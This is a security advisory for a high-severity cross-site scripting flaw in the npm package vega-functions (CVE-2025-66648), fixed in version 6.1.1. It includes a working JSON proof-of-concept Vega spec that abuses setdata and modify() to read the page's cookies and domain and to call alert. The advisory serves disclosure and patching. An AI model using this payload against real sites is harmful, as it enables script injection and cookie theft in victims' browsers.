# [H] `vega-functions` vulnerable to Cross-site Scripting via `setdata` function

## Summary
Severity: High
Advisory: GHSA-m9rg-mr6g-75gm
CVE: CVE-2025-66648
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-01-05
Source: https://github.com/advisories/GHSA-m9rg-mr6g-75gm
Type: github-advisory

## Affected
- npm: `vega-functions` — affected >=0 <6.1.1

## Details
### Impact

For sites that allow users to supply untrusted user input, malicious use of an internal function (not part of the [public API](https://vega.github.io/vega/docs/expressions/)) could be used to run unintentional javascript (XSS).

### Patches

Fixed in vega-functions `6.1.1`

### Workarounds

There is no workaround besides upgrading. Using `vega.expressionInterpreter` as described in [CSP safe mode](https://vega.github.io/vega/usage/interpreter/) does not prevent this issue.  


### Exploit Proof of Concept

Vega's expression `modify()` [function](https://github.com/vega/vega/blob/d8add5819346e5af597d82ef8253742acc0283ba/packages/vega-functions/src/functions/modify.js#L40), used by setdata, allows attacker to control both the method called and the values supplied, which results to XSS . This was a previous POC:


```json
{
  "$schema": "https://vega.github.io/schema/vega/v6.json",
  "data": [
    {
      "name": "table",
      "values": [
        {"category": "A", "amount": 28}
      ]
    }
  ],
  "signals": [
    {
      "name": "tooltip",
      "value": {},
      "on": [
        {"events": {"type":"timer","throttle":2000}, "update": "setdata('table',[['Domain: '+event.dataflow._el.ownerDocument.domain+' , cookies: '+ event.dataflow._el.ownerDocument.cookie ]])+warn('XSS is here', modify('table',2,3,null,event.dataflow._el.ownerDocument.defaultView.alert,{'tttt':'yyyy'}) )"},
        {"events": "rect:pointerout",  "update": "{}"}
      ]
    }
  ]
}
```

## References
- https://github.com/vega/vega/security/advisories/GHSA-m9rg-mr6g-75gm
- https://nvd.nist.gov/vuln/detail/CVE-2025-66648
- https://github.com/vega/vega
